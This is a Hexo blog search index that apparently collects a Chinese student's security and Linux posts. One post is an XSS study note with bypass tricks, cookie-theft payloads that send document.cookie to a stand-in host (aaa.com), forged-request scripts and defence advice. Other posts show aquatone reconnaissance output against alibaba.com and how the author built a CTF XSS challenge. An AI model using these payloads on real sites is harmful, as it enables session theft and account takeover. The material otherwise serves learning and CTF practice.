<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[重新认识XSS]]></title>
    <url>%2F2019%2F03%2F18%2F%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86XSS%2F</url>
    <content type="text"><![CDATA[最近找实习的时候被问到里一个关于XSS的问题，觉得原来学的还不怎么够，决定稍微深入一波。 0x00 分类 反射性XSS 存储型XSS DOM based XSS 这里面存储型XSS危害最大，反射性和DOM的不同是DOM based XSS是通过修改页面的DOM节点来形成XSS，但是从效果上看和反射性XSS类似。 0x01 CTF中的常见的XSS绕过做过一些题目总结大概就是下面几种： 编码绕过 编码绕过，主要时针对一些服务端对数据的一些转码，常见的比如构造js输出\u003c \u003e这样的十六进制编码代替&lt;&gt;，还有url编码，以及&amp;#x27;这样的html编码也可以绕过,比如白帽子讲web安全中的例子 123&lt;body&gt;&lt;a href=# onclick=&quot;alert(&apos;&amp;#x27;&amp;#x29;&amp;#x3b;alert&amp;#x28;&amp;#x27;2&apos;);&quot;&gt;test&lt;/a&gt;&lt;/body&gt; 这段代码的执行结果就是相当于 123&lt;body&gt;&lt;a href=# onclick=&quot;alert(&apos;&apos;);alert(&apos;2&apos;);&quot;&gt;test&lt;/a&gt;&lt;/body&gt; 具体什么时候使用什么样的编码还要根据语境，推测开发者使用了什么样的过滤函数，然后有的时候sql注入的编码技巧放在xss也同样会起到作用，比如常见的宽字节什么的有的时候在构造xss时会起到独到的作用。 重写大小写等等绕过 CTF以前会见到的就是重写或者大小写绕过，还有就是利用DOM XSS触发代替直接的&lt;script&gt;标签代码插入，现在基本比较少吧。 可利用事件和相似函数绕过 事件最常见的就是&lt;img src=# onerror=alert(1)&gt;这种的，然后一些其他的DOM事件可以参考JavaScript HTML DOM 事件 相似的函数也比较多吧，比如confirm(‘a’)代替alert这种的主要主要还是要看过滤情况，感觉现实应用中比较常见的XSS不成功的问题还是出现在转码上，利用DOM事件和特殊JS函数也都是简历在绕过了一些字符转义之后才能实现。 其实这些感觉总结的也并不全面，主要还是要靠具体情况具体分析，看看自己能控制的参数的位置，做了哪些过滤，是否有利用价值等等吧。具体问题具体分析。 0x02 一些playload和利用工具 最最常见的利用xss劫持用户cookie然后进行CSRF，这个可以自己搭建接收cookie的平台，也可以利用一些xss平台和工具实现，但是窃取cookie不是什么时候都有用，因此还比较常见还有利用xss使用户端执行恶意js代码后台直接发起一些get或者post请求，或者获取一些用户电脑和浏览器上的信息，还有就是比较新的js挖矿，Dos攻击，内网探测等，看过一些大佬的文章，大佬总能把XSS玩出各种花样。 先看一些payload 劫持cookie 获取cookie:其实就是想办法发送document.cookie到攻击者事先准备好的互联网上的就收接口。发送的方式有很多，比较常用的是利用src的请求直接get发送比如 1234567//稍微短一些可以&lt;script&gt;document.write(&quot;&lt;iframe width=0 height=0 src=&apos;http://aaa.com/cookie.php?cookie=&quot;+document.cookie+&quot;&apos;&gt;&lt;/iframe&gt;&quot;);&lt;/script&gt;//或者直接加载远程脚本，然后脚本里面就可以想怎么发就怎么发了，列举书中提到的一个例子，xsspt上也用的类似的方式获取cookie：var img = document.createElement(&quot;img&quot;);img.src = &quot;http://aaa.com/cookie.php?cookie=&quot;+document.cookie;document.body.appendChild(img); 然后当攻击者获取到cookie可以直接在对应的网站F12 console里面输入document.cookie=窃取到的cookie，然后就可以模拟登录了，当然能是要在网站没有做对应的限制的情况下。如果网站进行了IP与cookie绑定，或者依靠HttpOnly使攻击者只获得了一些无关紧要的cookie，那这招就不好用了，就要想其他办法利用了。 构造GET或者POST请求 因为不是什么时候盗取cookie都好用，有的时候获取不到cookie的时候，就需要跳过获取cookie、直接让用户发送一些我们需要的信息、或者使直接让用户的浏览器执行一些我们需要的操作。这就涉及到利用js构造一些GET和POST请求，让用户的浏览器自己执行攻击者想要的操作。然后用户发送GET操作代码可以直接参考上面的，但是这次就不是获取cookie了，而是直接使用户在当前网站做一些攻击者想要的操作。 书上有一个例子就是在一个博客网站利用xss，使用户的浏览器发送一个删除博客文章的get请求，原理和get发送cookie一样,只是get请求的链接使删除文章的链接。 主要说一下发送post请求。两种方法：ajax和构造from表单（这两种方法也可以发送get请求，就是相对复杂） 123456789101112131415161718192021222324252627282930313233343536//构造表单 可以 纯js 或者用innerHTML添加DOM文档 然后js执行submit()提交//直接用js var f = document.createElement(&quot;form&quot;); f.action = &quot;&quot;; //post提交的链接 f.method = &quot;post&quot;; document.body.appendChild(f); //添加参数 var i1 = document.createElement(&quot;input&quot;); i1.name = &quot;i&quot;;//参数名 i1.value = &quot;1&quot;;//参数值 f.appendChild(i1); ... //类似这种可以添加很多参数 f.submit();//在DOM文档中添加表单 var addDiv = document.createElement(&quot;div&quot;); docment.body.appendChild(addDiv); addDiv.innerHTML = &quot;&quot;; //这里添加需要的表单 注意form表单加上id 以便发送 假设使test document.getElementById(&quot;test&quot;).submit();//ajax try&#123; xhr=new XMLHttpRequest();&#125;catch(e)&#123; xhr=newActiveXObject(&quot;Microsoft.XMLHTTP&quot;);&#125;xhr.open(&quot;post&quot;,&quot;#&quot;,true);//# 提交到的链接xhr.setRequestHeader(&quot;content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xhr.send(&quot;a=hhhhh&amp;b=admin&quot;);//提交的内容xhr.onreadystatechange=function()&#123;if(xhr.readyState==4)&#123; if(xhr.status==200)&#123; ... //如果提交成功要进行的操作 &#125;&#125; 然后再DOM中添加表单的方法还可以用于XSS钓鱼，大致过程就是攻击者XSS向网页中添加一个表单，要求用户输入用户名密码，如果用户没有发现的话就会把自己的密码输入后发送给攻击者事先准备好的web接收接口。 一些信息收集用到的参数 123navigator.userAgent //用户浏览器版本document.location //页面的一些信息document.cookie //cookie 突然发现这个好像是一个挺大的学问，可以依靠JS收集到的信息不止包括这些，还有可能识别用户安装的软件（迅雷），浏览器插件，电脑操作系统，电脑IP，等等很多方面，网上也能找到很多利用脚本，还可以看一些xss平台的源代码。 一些工具 XSS平台 可以自己搭建，也可以直接用网上的,或者准备好payload，然后直接再服务器上监听80端口也可以 BeEF 感觉从某种意义上讲也是xss平台的一种，但是有比XSS平台好很多的交互性，攻击者可以实时的向用户的前端发送各种指令，还可以配合metasploit，进一步渗透。 XSS shell 和BeEF一样采用了一种叫XSS-Proxy的技术，可以实时的对受害者浏览器监控，原理是动态生成一个iframe，并可控制iframe的location值然后实现一些操作，但是这个XSS shell是再asp的就是要配置在Windows上，然后BeEF是直接集成在kali里面的。然后xss shell的配置和使用网上的教程比较少，我会单独写一篇文档介绍。 相关链接 ： XSS平台-安全测试 XSS平台- （支持http/https）XSS Platform FreeBuf: 如何在BeEF中使用metasploit颠覆你的浏览器 FreeBuf: 科普跨站平台XSS SHELL使用方法 github: xss shell项目地址 Portcullis实验室: xss shell 利用XSS Shell进行XSS测试 0x03 关于XSS防御 httpOlny 在关键的cookie上添加HTTPOnly是一种比较常见的保护cookie的措施，虽然是市面上一种标准的做法，但也不是完全的安全，比如（CVE-2012-005），就通过了植入超大的cookie，然后通过报错页面得到受保护cookie。而且这只是一种保护cookie的做法，不能防御不需要盗取cookie的其他类型xss。 然后关于php添加httponly的一些代码 123456789101112//php.ini中全局开启httponly; Whether or not to add the httpOnly flag to the cookie, which makes it inaccessible to browser scripting languages such as JavaScript.; http://php.net/session.cookie-httponlysession.cookie_httponly =//代码中全局httponlyini_set(&quot;session.cookie_httponly&quot;, 1);//函数单独设置setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);//老版本header函数设置header(&quot;Set-Cookie: hidden=value; httpOnly&quot;);//等等 输入输出检查 输入的时候可以稍微严格要求输入，不只是前端添加验证函数和正则，服务器端也尤其要严格过滤，如果需要转义注意输出的时候不要改变原意。然后输出的时候，可以用一些转义函数，比如php的htmlspecialchars()函数将&amp;、&quot;、&#39;、&lt;、&gt; 这五个符号转化成html实体。还有更厉害的htmlentities()，转义全部字符为html实体字符等等。然后要注意前后端相配合合理的使用转义函数，正确的地方正确的编码转义，然后很多web前后端框架都有针对防御xss的转义函数，注意了解合理使用。 XSS Filter 比如Anti-Samy、HTMLPurify等等，用来检查一些比较长的文本中是否含有XSS。但是我也没有实际应用过，大致知道有这么个东西。 以上的方法也不能完全的防御XSS，还有一些比如DOM Based XSS需要合理的使用JS和HTML编码解码，还有各种比较偏门的XSS（Flash XSS）等等，需要编程人员时刻小心。 大佬的文章FreeBuf: 经验分享 | XSS手工利用方式，感觉这个思路非常开阔，除了常见的盗取cookie，还讲解了利用XSS内网探测，挖矿，Dos攻击等。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[子域名挖掘工具aquatone]]></title>
    <url>%2F2019%2F01%2F15%2F%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7aquatone%2F</url>
    <content type="text"><![CDATA[前言 常见的子域名挖掘工具 Fierce，SubBrute和 Gobuster，还有在线的netcraft 等等吧。今天看见了一个叫aquatone的工具，觉得挺强的。 0x00 安装 更新 kali 12# apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade # apt-clean 安装 gem install apuatone 安装完成后就可以使用了。 0x01 简单使用12# aquatone-discover -d alibaba.com -t 20//-d 域名 -t 线程数 0x02 模块介绍 这个工具使用是有一定顺序的，有的时候会用到上一步的结果，所以如果需要执行下一步的话就一定要这一部分执行完毕后保存了结果，不要中途停止（重点），如果不按照顺序会有相应的提醒，只要按照提醒一步一步来就完事了（废话）。然后扫描结果会保存到一个aquatone文件夹中。 1.aquatone-discover 此工具主要用于子域名挖掘，可以列出；子域名和对应的IP，据说除了常见的字典爆破，还用了很多开源和互联网服务来大幅增加已发现的子域数量，实际测试中netcraft查询alibaba.com有96条，而这个工具查询出了6951条，有点惊人。然后扫描完毕后还会默认保存结果到两个文件一个是txt文件、一个是json文件，方便进行下一步处理。123456789101112131415161718192021222324root in ~ λ aquatone-discover --help Usage: aquatone-discover OPTIONS -d, --domain DOMAIN Domain name to assess --nameservers NAMESERVERS Nameservers to use --fallback-nameservers NAMESERVERS Nameservers to fall back to --[no-]ignore-private Ignore hosts resolving to private IP addresses --set-key KEY VALUE Save a key to key store --list-collectors See information on collectors --only-collectors COLLECTORS Only run specified collectors --disable-collectors COLLECTORS Disable specified collectors -t, --threads THREADS Number of concurrent threads to use -s, --sleep SECONDS Seconds to sleep between lookups -j, --jitter PERCENTAGE Jitter factor for sleep intervals #这个参数是指定使用的子域名来源方式 --netcraft-pages PAGES Number of Netcraft pages to process (default: 10) --gtr-pages PAGES Number of Google Transparency Report pages to process (default: 30) --wayback-machine-timeout SECONDS Timeout for Wayback Machine collector in seconds (default: 30) --publicwww-pages PAGES Number of PublicWWW pages to process (default: 30) --shodan-pages PAGES Number of Shodan API pages to process (default: 10) --wordlist WORDLIST OPTIONAL: wordlist/dictionary file to use for subdomain bruteforcing --censys-pages PAGES Number of Censys API pages to process (default: 10) -h, --help Show help 2.aquatone-scan 这个是用于端口扫描的工具，你只需要指定上级域名，他就可以把这个域名的下级域名的常见端口进行扫描。扫描结果大致如下:1234567891011121314151617root in ~/aquatone on master ● λ aquatone-scan -d alibaba.com __ ____ _____ ___ ______ _/ /_____ ____ ___ / __ `/ __ `/ / / / __ `/ __/ __ \/ __ \/ _ \/ /_/ / /_/ / /_/ / /_/ / /_/ /_/ / / / / __/\__,_/\__, /\__,_/\__,_/\__/\____/_/ /_/\___/ /_/ scan v0.5.0 - by @michenriksenLoaded 6951 hosts from /root/aquatone/alibaba.com/hosts.jsonProbing 20080 ports...80/tcp 106.11.92.14 pcookie.alibaba.com80/tcp 47.94.121.92 uf-bj.alibaba.com443/tcp 140.205.230.44 alisports.alibaba.com, finnet.alibaba.com, svn.alibaba.com80/tcp 116.95.26.231 img.alibaba.com443/tcp 42.156.140.126 dk.alibaba.com, xy.alibaba.com443/tcp 106.11.92.14 pcookie.alibaba.com 可以看见相同的IP开放相同的端口也会把扫描结果合并，可以说很人性化了。最后的执行结果也会保存进文件中。123456789root in ~/aquatone on master ● λ aquatone-scan --help Usage: aquatone-scan OPTIONS -d, --domain DOMAIN Domain name to assess -p, --ports PORTS Ports to scanm #指定端口，可以过滤掉一部分的信息 --timeout SECONDS Timeout in seconds for port probes -t, --threads THREADS Number of concurrent threads to use #指定线程 -s, --sleep SECONDS Seconds to sleep between port probes -j, --jitter PERCENTAGE Jitter factor for sleep intervals -h, --help Show help 3.aquatone-gather 这个是按个ip访问，采集一些相应状态码等信息会保存在aquatone/域名/headers等，要提前安装好nodejs和npm，还有nightmare12345678~ apt-get install nodejs~ apt-get install npm# 安裝electron~ cd /var/lib/gems/2.5.0/gems/aquatone-0.5.0~ npm install electron# 安裝nightmare~ cd /var/lib/gems/2.5.0/gems/aquatone-0.5.0~ npm install --save nightmare --unsafe-perm=true --allow-root 一定要按照这个顺序安装，不然会报Incompatability Error: Nightmarejs must be run on a system with a graphical desktop session (X11)的错误。运行状态大致如下，可以快速的过滤掉一些不需要的主机。1234567891011121314151617181920212223root in ~ λ aquatone-gather -d alibaba.com __ ____ _____ ___ ______ _/ /_____ ____ ___ / __ `/ __ `/ / / / __ `/ __/ __ \/ __ \/ _ \/ /_/ / /_/ / /_/ / /_/ / /_/ /_/ / / / / __/\__,_/\__, /\__,_/\__,_/\__/\____/_/ /_/\___/ /_/ gather v0.5.0 - by @michenriksenProcessing 690 pages...Processed: http://112.124.156.18/ (zhengjuzx.alibaba.com) - 200 OKProcessed: https://106.11.208.151/ (webdisk.en.alibaba.com) - 200 OK Failed: http://106.11.223.101/ (mall.alibaba.com) - navigation error ERR_TOO_MANY_REDIRECTS Failed: http://203.119.215.229/ (13662669516081.gw.china.alibaba.com) - navigation error ERR_TOO_MANY_REDIRECTSProcessed: http://42.156.140.126/ (dk.alibaba.com) - 200 OKProcessed: http://203.119.206.72/ (campus.alibaba.com) - 200 OKProcessed: https://47.97.222.143/ (softsec.security.alibaba.com) - 200 OKProcessed: https://140.205.61.39/ (finance.alibaba.com) - 404 Not Found Failed: http://203.119.215.229/ (13685428665205.gw.china.alibaba.com) - navigation error ERR_TOO_MANY_REDIRECTSProcessed: https://106.11.223.101/ (country.alibaba.com) - 200 OKProcessed: http://205.204.101.142/ (news.alibaba.com) - 404 Not FoundProcessed: https://106.11.223.101/ (kr.alibaba.com) - 200 OK Failed: http://203.119.215.229/ (13660049611526.gw.china.alibaba.com) - navigation error ERR_TOO_MANY_REDIRECTSProcessed: http://106.11.223.101/ (m.indonesian.alibaba.com) - 200 OK 然后结果保存在aquatone/域名/下的文件夹，供进一步分析。 4.aquatone-takeover 这个功能嘛是查看主机域名接管和劫持漏洞的，也会保存出一个叫takeovers.json的文件，根据扫描域名数量，要消耗的时间也不尽相同（废话）。 0x03 参考资料 子域名扫描器 - aquatone 这个比较偏向于参数吧，感觉这个工具有的参数我还没理解怎么透彻 github项目地址 外国大佬博客]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>子域名</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次出ctf中出xss题目]]></title>
    <url>%2F2018%2F09%2F25%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%87%BActf%E4%B8%AD%E5%87%BAxss%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[0x00 问题分析 xss一般的出题思路是考一些绕过，或者一些常见函数，利用这些使用户浏览器弹窗，但是最终的弹窗结果是显示在用户浏览器端的，单纯的借助php是没办法在浏览器验证是否造成了弹窗的（也可能是有办法我没发现），以前做过一些CTF关于xss的题目，有的考编码绕过，当用户提交含有绕过编码的字段，就直接给出flag（bugku xss），还有一些是通过浏览器端js判断，但是只要用户读懂js就可以不通过弹窗直接可以get flag（hackinglab xss），等等吧，感觉都不怎么理想。 0x01解决 解决思路来源于这位大佬的博客，但是这位大佬是用js写的，我的js比较水，就用php完成的这个题目 思路： phantomjs是一个没有图形界面的浏览器,可以直接使用少量js+phantomjs本身提供的函数和接口（好像也提供了php的接口）直接操作。 利用php中的exec或者system之类的函数执行系统命令，调用js打开操作phantomjs验证弹窗等，并输出返回值，判断是否给出flag实际操作 环境部署 搭建lamp，我是再centos7上弄的，具体的搭建过程就不详细描述了 安装nodejs，大概这样三条命令 123yum info epel-releaseyum install nodejsnode -v 安装phantomjs，命令如下 12npm install phantomjs -gphantomjs --version 具体过程中可能要关闭selinux，操作如下 12setenforce 0(暂时)修改/etc/selinux/config文件中的SELINUX=&quot;&quot; 为 disabled ，然后重启。（永久） 这样环境就基本搭建完了，可以在命令行中试一下phantomjs，其实还是挺有意思 代码实现 js调用phantomjs验证 1234567891011121314151617181920212223242526272829var webPage = require(&apos;webpage&apos;);var page = webPage.create();var postBody = &apos;id=1&apos;;var url = &apos;http://127.0.0.1/verification.php&apos;//接收命令行参数 第一个要验证是否能弹窗的js的base64（也可以不用加密） 第二个验证的是网页地址base64 var system = require(&apos;system&apos;);if (system.args.length === 1) &#123; //console.log(&apos;Try to pass some args when invoking this script!&apos;); phantom.exit();&#125; else &#123; system.args.forEach(function (arg, i) &#123; if(i === 1)&#123; postBody = &apos;id=&apos;+ atob(arg); &#125; if(i ===2 )&#123; url = atob(arg); &#125; &#125;);&#125;page.open(url,&apos;POST&apos;,postBody,function(status) &#123;//打开网页 //console.log(&apos;Status: &apos; + status);//获取加载消息 //console.log(page.content);//获取页面内容 //page.render(&apos;aa.png&apos;);//获取屏幕截图 phantom.exit(); &#125;);page.onAlert = function(msg) &#123;//获取alert弹窗消息 比如如果执行了alert(&apos;key&apos;)就会输出key 没弹框的话就什么都不输出 console.log(msg);&#125;; php调用js ，这个没什么说的，就是一个系统命令执行，注意防一下命令执行，还有就是直接用nodejs就不会有这个问题 12exec(&apos;phantomjs --output-encoding=utf8 verification.js &apos;.base64_encode(iconv(&apos;utf-8&apos;,&apos;gbk&apos;,$_key)).&apos; &apos;.base64_encode(iconv(&apos;utf-8&apos;,&apos;gbk&apos;,$_url)),$output_main);//其实就是 exec(&apos;命令&apos;,$返回值) 注意编码，还有就是返回值是数组形式的可以用count()之类的函数判断是否为空 需要注意的地方： js代码一定要写对，效率要高，js一旦出问题会卡好久，应该会占用一部分资源php中要做好防止命令执行还有一个就是一定要想好逻辑，避免出现死循环，比如：你用ctfer访问的页面去验证是否弹窗，那是不是当phantomjs的验证弹窗操作也会被服务器理解为成ctfer的提交操作，然后再调用phantomjs去验证。。。。然后服务器就崩溃了，这里一定要注意，我想出的解决方法就是在代码中把phantomjs和ctfer分开，传个key值什么的，也可以写一个简单的验证页面（echo $_POST(‘id’);这种的），就可以解决这个问题 0x02 附：关于csrf 这次出题我还出了一个关于csrf，大致就是利用xss平台或者自己搭建网站获取管理员cookie，然后冒充管理员登录getflag，其实本来没什么说的，但是中间遇到了一个phantomjs模拟登录后进如登录后的界面的问题，以前我写登录一般都是直接用js跳转的，但是这个phantomjs没办法得到js跳转后的页面，这样模拟管理员登录查看留言时，管理员就看不到留言，后来使用php的header()函数解决 0x03 再附：一些参考文件 phantomjs官网，可以查询一些函数接口 什么的 大佬博客讲怎么用js出xss题目的 附上我的题目代码这个代码还有一个bug,熟悉js的可以再优化一下]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python制作01组成的记事本照片]]></title>
    <url>%2F2018%2F08%2F24%2Fpython%E5%88%B6%E4%BD%9C01%E7%BB%84%E6%88%90%E7%9A%84%E8%AE%B0%E4%BA%8B%E6%9C%AC%E7%85%A7%E7%89%87%2F</url>
    <content type="text"><![CDATA[有趣的我又来写蛇皮代码了 前两天看沙雕网友总是在秀那个一个人用记事本写01然后就画出一张照片的那个视频，我决定用python实现一下，有hackinglab的基础肯定没问题的（估计出题的知道我把学到的这个用在这里想打人了吧 hhhhhh） f不多说直接上脚本 和之前的验证码识别一样要安装一些库和支持123456789101112131415161718192021222324from PIL import Imageimport numpy as np import matplotlib.pyplot as plt#打开图片im = Image.open(&apos;11.png&apos;)#减少图片的色彩，化为灰度图im = im.convert(&apos;L&apos;)img=np.array(im)rows,cols = img.shapeFile = open(&quot;hello1.txt&quot;, &quot;w&quot;)for i in range(rows): if(i%4==0): File.write(&quot;\n&quot;) for j in range(cols): if(j%2==0 and i%4==0): if(img[i,j]&lt;=128): File.write(&apos;0&apos;) else: File.write(&apos;1&apos;) File.close()print(rows)print(cols) 再来个效果图 注意这个记事本字体要根据代码调整合适大小 我这个是2号字(直接在输入字号那里输2回车)粗体，然后把那个自动换行取消掉，感觉还是有点大，还可以稍微调一下 最后 其实这个不需要这个代码就能实现的~ 嘿嘿嘿嘿~ 惊不惊喜、意不意外，就是使用asciiview这个Linux下的工具，安装过程和简单使用如下：12sudo apt-get install aview imagemagickasciiview +图片 大概就这样 附上一个好玩的十三个有彩蛋的Linux命令（营销号警号）]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>有趣</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[教你如何放弃Windows改用kali]]></title>
    <url>%2F2018%2F08%2F24%2F%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E6%94%BE%E5%BC%83Windows%E6%94%B9%E7%94%A8kali%2F</url>
    <content type="text"><![CDATA[如何放弃Windows改用kali 之前就听说各种大佬已经不用windows改用linux，于是我也尝试了一波，大致分为美化和运行Windows应用两部分 关于美化 linux的美化除了常见的设置主题壁纸终端配色，还有修改桌面启动器这一说，感觉大概就像Android手机可以换启动器一样，下面主要介绍两种常见的桌面启动器 0x00 kde桌面apt-get install kde-plasma-desktop 安装中间会有一个选择默认桌面的过程，直接选择kdm就行了 ，安装完成注销，或者重启，在输入密码界面，选择上kde离子桌面，然后就可以进系统了，在这个桌面下的应用商店把软件更新一下 注意root下是打不开默认的文件管理器的 可能要装一下 dolphin（文件管理器）和deepin-terminal（一个挺不错的终端），apt-get安装就可以就这样吧，感觉不错的话还可以把gnome删了123apt-get remove gnome-shellapt-get remove gnome-desktop3-data 接下来自己配置一些主题插件就可以了附一张效果图，感觉还可以， 0x01 gnome桌面 安装主题管理：apt-get install gnome-tweak-tool 下载主题：这里进入gtk 3.x，选一个喜欢的下载 解压主题包：123tar -zxvf Ubuntu-Touch.tar.gz cp -r Ubuntu-Touch /usr/share/themes 然后 应用程序》》系统工具》》首选项》》高级设置 打开皮肤管理面板，选择喜欢的设置就可以了 还有就是那个kde下的那个终端这里也可以用（个人感觉这个终端做的还真是不错） 运行Windows应用 我知道有两种途径：wine和安装linux版的Windows软件 0x00 wine apt-get install wine32也许会用到dpkg --add-architecture i386(安装32位库)安装wine，这个东西我感觉就相当于mingw，mingw是在Windows上运行linux的一些环境，wine正好相反，他会生成/root/.wine的路径，下模仿Windows分盘，C盘下有windows，Program Files等等一些文件夹运行exe命令 wine 文件名.exe用这个安装Windows软件也可以wine还可以调整Windows兼容版本什么的，但是 因为桌面问题，没有点开这个应用的图形化界面，，，， 0x01 安装linux版的Windows软件 关于这个大部分都是用gdebi安装debw文件，还有一些软件本身就有linux的版本，按照步骤安装或者解压就行了。 下面就说一下gdebi如果没有这条命令，可能要换源apt-get update一下，才能安装上这条命令然后去下载对应Windows应用的deb文件，执行下面命令就安上了1gdebi deb文件 这样应该也可以1dpkg -i ubuntu-kylin-software-center_1.3.14-0_349_ubuntu17.10.1_all.deb 出现乱码可以替换字体文件还可以安装虚拟机什么的运行Windows应用，但是感觉有点麻烦， 最后 感觉传说一些大佬不用Windows直接用linux也不是不可能，有空慢慢研究 最最后 从gitbook上转过来有意思的笔记的到这里就没了]]></content>
      <categories>
        <category>环境配置</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux快捷键启动终端]]></title>
    <url>%2F2018%2F08%2F24%2FLinux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%90%AF%E5%8A%A8%E7%BB%88%E7%AB%AF%2F</url>
    <content type="text"><![CDATA[Linux快捷键启动终端 比较喜欢这个东西，记录一下设置，添加快捷键 命令 gnome-terminal 快捷键 win+r（自己随便） 这可能是我最短的blog了]]></content>
      <categories>
        <category>环境配置</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>蛇形操作</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wamp配置局域网内可以访问]]></title>
    <url>%2F2018%2F08%2F24%2Fwamp%E9%85%8D%E7%BD%AE%E5%B1%80%E5%9F%9F%E7%BD%91%E5%86%85%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%2F</url>
    <content type="text"><![CDATA[wamp配置局域网可以访问 今天终于找到了干净利落解决这个问题的方法 虽然不是什么大问题但是也记一下吧 wamp3.0.6 64bit 0x00 添加切换在线离线 wamp图标右键，出来个wamp Settings，选择Menu item : Online / Offline 这是左键图标就会在最下面有一个 “切换到在线状态” 按钮 点击切换到在线状态，此时访问会有403错误 0x01 编辑httpd-vhost文件 左键图标—&gt;Apache—&gt;httpd-vhosts.conf 找到 Require local，并用“Require all granted”代替它 完成 0x02 再说三个配置方面的问题1.wamp没有找到MSVCR100.dll 解决方法：安装 VC++运行库版本 参考下载地址：https://www.microsoft.com/zh-cn/download/details.aspx?id=5555​ 2.linux下安装phpcms文件读写问题 再附一个安装phpcms时候遇到小问题 ，就是安装的时候文件的所有需要写权限的文件都是不可写，权限777也不行 解决方法 ：这是selinux的问题执行命令：getenforce //判断selinux状态Enforcing提示是强制模式所以接着执行setenforce 0 //改成宽容模式执行命令：getenforce结果：Permissive这时候再看安装phpcms已经看到文件权限变可写注：SELinux 宽容模式(permissive) 强制模式(enforcing)； 其实不止是这个很多时候搭建网站都会有这个问题，当web程序需要写文件时一般都会有这个问题，关闭了selinux固然方便但也不安全 3.wamp设置不能查看网站目录 编辑httpd-vhosts.conf 去掉Options +Indexes +Includes +FollowSymLinks +MultiViews中的+Indexes +Includes +MultiViews 最后大致改成这样12345678910111213# Virtual Hosts# Options +Indexes +Includes +FollowSymLinks +MultiViews&lt;VirtualHost *:80&gt; ServerName localhost DocumentRoot D:/wamp64/www &lt;Directory &quot;D:/wamp64/www/&quot;&gt; Options FollowSymLinks AllowOverride All Require all granted &lt;/Directory&gt;&lt;/VirtualHost&gt;# linux下类似]]></content>
      <categories>
        <category>环境配置</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>wamp</tag>
        <tag>selinux</tag>
        <tag>apache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali安装chrome]]></title>
    <url>%2F2018%2F08%2F24%2Fkali%E5%AE%89%E8%A3%85chrome%2F</url>
    <content type="text"><![CDATA[kali安装chrome 算是安装多系统的一个后续，很多Windows上的软件都可以通过这种方式安装在linux上 0x00 下载.deb安装文件1# wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb 0x01 安装# gdebi google-chrome-stable_current_amd64.deb 这里可能会提示没有gdebi 安装 # apt-get install gdebi 提示无法定位软件包更新一下，重新执行就好了 # apt-get update 附：kali换源 编辑 /etc/apt/sources.list 添加上要加的源就行了，上面两个是官方源，下面是清华的12345deb http://http.kali.org/kali kali main non-free contribdeb-src http://http.kali.org/kali kali main non-free contribdeb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free]]></content>
      <categories>
        <category>环境配置</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>蛇形操作</tag>
        <tag>环境优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用hexo在GitHub上搭建博客]]></title>
    <url>%2F2018%2F08%2F24%2F%E5%88%A9%E7%94%A8hexo%E5%9C%A8GitHub%E4%B8%8A%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[利用hexo在GitHub上搭建博客 到底还是把这个更新到blog上面来了 。。。 环境：Windows、node.js、github、git、hexo 0x00 准备 github注册登陆，建一个用户名.github.io的库，好要设置主分支 本地安装git，傻瓜安装，选上add to path，如果有git gui here 和git bash here就勾选上，管理灵活一些，具体操做会写一篇操做 安装node.js：傻瓜安装，直接去官网下载最新版本，最新版不用配置环境变量，尽量不要用老版会有兼容性问题 建立一个储存博客的空文件夹，比如D:/blog/ 安装hexo:Windows下npm install hexo-cli -g 0x01 本地搭建+应用主题1.初始化， 进入用于储存博客的空文件夹右键git bash here，输入如下命令`hexo init 2.在本地生成静态页面 命令 ： hexo generate 或者 hexo g这里有可能出一个这样的错误 ERROR Local hexo not found in D:\blog ERROR Try running: &#39;npm install hexo --save&#39; 关于解决大家众说纷纭，我当时的解决大致命令如下(昨晚十二点了记不太清了)123npm install hexo-deployer-git --savenpm install hexo --save 3.本地启动hexo server 或者 hexo s 这个命令还可以加其他参数，比如 -p 端口 指定端口 ，-debug 显示详细错误，如果没有特殊指定端口执行完此命令后就可以浏览器打开http://localhost:4000,查看本地的静态博客了 4.设置主题 到hexo.io上面下载自己喜欢的主题下载下来解压到储存博客的路径下的themes文件夹，，不明白路径可以参照原来自带的landscape主题，解压完成后修改 存放博客目录的（注意不是主题目录的）_config.yml文件，大概在结尾的地方修改成这个样子 把涂黑的地方改成你主题存放的文件夹名 然后主题就应用完了，可以在本地生成静态页面（hexo g）并且查看主题是否用用成功（hexo s，访问127.0.0.1:4000） 注意要阅读主题说明文档（README.md）会有一些主题的个性化配置及说明 0x02 发布到GitHub 还是修改_config.yml(博客目录下的，一般在文档最后)配置成如下 